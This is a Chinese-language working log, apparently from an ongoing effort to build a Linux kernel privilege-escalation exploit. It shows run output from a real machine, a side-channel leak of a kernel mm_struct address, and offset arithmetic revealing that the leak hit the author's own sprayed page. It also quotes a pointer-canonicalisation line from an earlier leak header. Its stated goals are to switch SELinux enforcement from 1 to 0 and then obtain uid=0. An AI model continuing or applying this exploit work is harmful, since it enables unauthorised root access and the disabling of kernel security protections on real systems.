# 43499 · 重大线索：snitch 的"found"落在我们自己的页面之内（round 148）

## 真机（同一跑的三步 ✓）

```
main: prepare status=ok step=11 opened=505 closed=3 base=0xffff800000028000 errno=0
main: snitch loop saw=1 address=0xffff80000002c400
main: snitch real verdict=ok probes=178 rounds=3 found=0xffff80000002c400
main: step result w1 => won ✓ ；（w2/w3 同）
main: window clean=1 violations alloc=0 log=0 indirect=0 lua=0 ✓（窗口干净 ⇒ 这条假设否证 ✓）
main: sentinel … w+0x1180=0 +0x1198=0 +0x11a0=0 +0x11a8=0 +0x11c0=0 +0x11c8=0 | lock+0xe98=0 ✓
main: victim comm after len=15 first=103 ✗（未改 ✓）
main: selinux enforce=1 ✗（三次读数一致 ✓）
```

## 算一下就知道不对劲 ✗

```
页面 = base + payload_delta = 0xffff800000028000 + (-0xE80) = 0xffff800000027180
页面长度 = 65536 ⇒ 覆盖 [0x…27180, 0x…37180)
泄漏地址 0xffff80000002c400 ⇒ **落在页面之内** ✗
⇒ snitch 的"found"极可能是**我们自己摆的形状**（自检）✗，不是内核里的 mm_struct ✗
⇒ 而 base/几何/页面全部由它推出 ⇒ 走查永远碰不到真实目标 ✓（与"处处对齐却不写入"完全吻合 ✓）
```

## 与退役的对照（下一步读它 ✓）

```
退役 leak/kernelsnitch.h 有对候选的**规范化/校验**：
  :262  canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
  :273  tagged_candidate    = … tag_candidate << 56 …
⇒ ⇒ 本树是否也有这一步（"候选必须像内核指针"的校验）需要核对 ✓
```

## 下一步（判据 ✓）

1. 核本树 snitch 的候选校验（是否把"落在自有映射内"的候选排除 ✗）；
2. 判据（**直读** ✓）：`main: selinux enforce` 从 1 变 **0** ⇒ 机制真通 ✓；
3. 之后才是 `uid=0` ✓。
